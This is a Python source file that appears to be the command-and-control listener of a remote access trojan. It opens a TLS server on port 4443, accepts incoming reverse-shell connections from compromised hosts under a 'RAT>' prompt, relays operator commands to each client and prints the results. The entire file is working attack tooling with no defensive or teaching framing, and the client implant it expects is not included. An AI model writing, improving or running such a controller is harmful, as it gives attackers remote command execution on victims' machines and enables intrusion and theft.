import socket
import ssl
import os
import sys
import time

HOST = '0.0.0.0'
PORT = 4443

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
try:
    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
except FileNotFoundError:
    print("[!] SSL certificate or key not found.")
    sys.exit(1)
except ssl.SSLError as e:
    print(f"[!] SSL certificate error: {e}")
    sys.exit(1)

def handle_client(client, addr):
    print(f"[+] Reverse Shell Connected from {addr}.\n")
    while True:
        try:
            cmd = input("RAT> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ["exit", "quit"]:
                client.sendall(b"exit")
                print("[+] Session terminated.")
                break
            if cmd.lower() in ["cls", "clear"]:
                clear_screen()
                continue
            client.sendall(cmd.encode())

            result = b""
            while True:
                data = client.recv(4096)
                if not data:
                    raise ConnectionResetError("Connection lost.")
                if b"__end__" in data:
                    result += data.replace(b"__end__", b"")
                    break
                result += data

            output = result.decode(errors="ignore").strip()
            print(output if output else "[*] No output returned.")
        except (ConnectionResetError, BrokenPipeError):
            print(f"\n[!] Client {addr} disconnected.\n")
            break
        except Exception as e:
            print(f"[!] Error in command loop: {e}")
            break

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        server_socket.settimeout(1)
        print(f"[+] Listening on port {PORT}...")

        with context.wrap_socket(server_socket, server_side=True) as ssl_server:
            ssl_server.settimeout(1)
            waiting_shown = False  # <-- flag to prevent spamming
            while True:
                try:
                    if not waiting_shown:
                        print("[*] Waiting for incoming connection...")
                        waiting_shown = True

                    client, addr = ssl_server.accept()
                    print(f"\n[+] Hello B1ATCH {addr}")
                    waiting_shown = False  # reset flag after connection

                    try:
                        handle_client(client, addr)
                    except Exception as e:
                        print(f"[!] Error handling client {addr}: {e}")
                    finally:
                        client.close()
                        waiting_shown = False  # reset after disconnect

                except socket.timeout:
                    continue
                except KeyboardInterrupt:
                    print("\n[!] Interrupted by user.")
                    break
                except Exception as e:
                    print(f"[!] Listener error: {e}")
                    time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Interrupted by user.")
except Exception as e:
    print(f"[!] Fatal error: {e}")
